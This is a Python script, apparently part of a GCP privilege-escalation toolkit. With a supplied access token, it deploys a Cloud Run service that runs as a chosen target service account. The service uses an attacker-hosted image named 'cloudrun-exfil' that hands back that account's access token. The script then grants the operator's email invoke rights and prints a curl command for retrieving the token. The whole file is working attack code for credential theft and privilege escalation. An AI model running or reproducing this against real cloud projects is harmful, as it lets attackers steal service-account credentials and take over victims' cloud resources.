#!/usr/bin/env python3

# A gcr.io link to the Docker image to deploy the Cloud Run Service with
# The included Dockerfile will return the access token associated with the target Service Account in the HTTP response, so this should be used in most cases
# Build/upload ./ExploitScripts/CloudRunDockerImage to your own GCP project's Container Registry, make it publicly accessible, then put the link here
GCR_IMAGE = 'gcr.io/some-public-project/cloudrun-exfil'

PROJECT_ID = ''
YOUR_EMAIL = ''
TARGET_SERVICE_ACCOUNT = ''
REGION = 'us-west1'
ACCESS_TOKEN = input('Enter an access token to use for authentication: ').rstrip()

from apiclient.discovery import build
import google.oauth2.credentials
import time, json

credentials = google.oauth2.credentials.Credentials(ACCESS_TOKEN)
service = build(serviceName='run', version='v1', credentials=credentials)

body = {
    'apiVersion': 'serving.knative.dev/v1',
    'kind': 'Service',
    'metadata': {
        'annotations': {
            'client.knative.dev/user-image': GCR_IMAGE
        },
        'name': 'cloudrun-exfil',
        'namespace': PROJECT_ID
    },
    'spec': {
        'template': {
            'metadata': {
                'annotations': {
                    'client.knative.dev/user-image': GCR_IMAGE,
                },
                'name': 'cloudrun-exfil-00001-zif',
                'labels': {
                    'cloud.googleapis.com/location': REGION
                }
            },
            'spec': {
                'serviceAccountName': TARGET_SERVICE_ACCOUNT,
                'containers': [{
                    'image': GCR_IMAGE
                }]
            }
        }
    }
}

service._baseUrl = f'https://{REGION}-run.googleapis.com/'

res = service.namespaces().services().create(parent=f'namespaces/{PROJECT_ID}', body=body).execute()

# print(json.dumps(res, indent=4))

print('Waiting 30 seconds for the service to be created...')
time.sleep(30)

res = service.namespaces().services().list(parent=f'namespaces/{PROJECT_ID}').execute()

# print(json.dumps(res, indent=4))

for item in res.get('items', []):
    if item['metadata']['name'] == 'cloudrun-exfil':
        url = item['status']['url']
        break

body = {
    'policy': {
        "bindings": [
            {
                'role': 'roles/run.invoker',
                'members': [
                    f'user:{YOUR_EMAIL}'
                ]
            }
        ],
        'version': 3
    }
}

# If you already have permission to invoke the service, this can be left out
res = service.projects().locations().services().setIamPolicy(resource=f'projects/{PROJECT_ID}/locations/{REGION}/services/cloudrun-exfil', body=body).execute()

print(json.dumps(res, indent=4))

print(f'URL: {url}')

print('Run the following command as your user to fetch the Service Account\'s access token:')
print(f'    curl -H "Authorization: Bearer $(gcloud auth print-identity-token)" {url}')
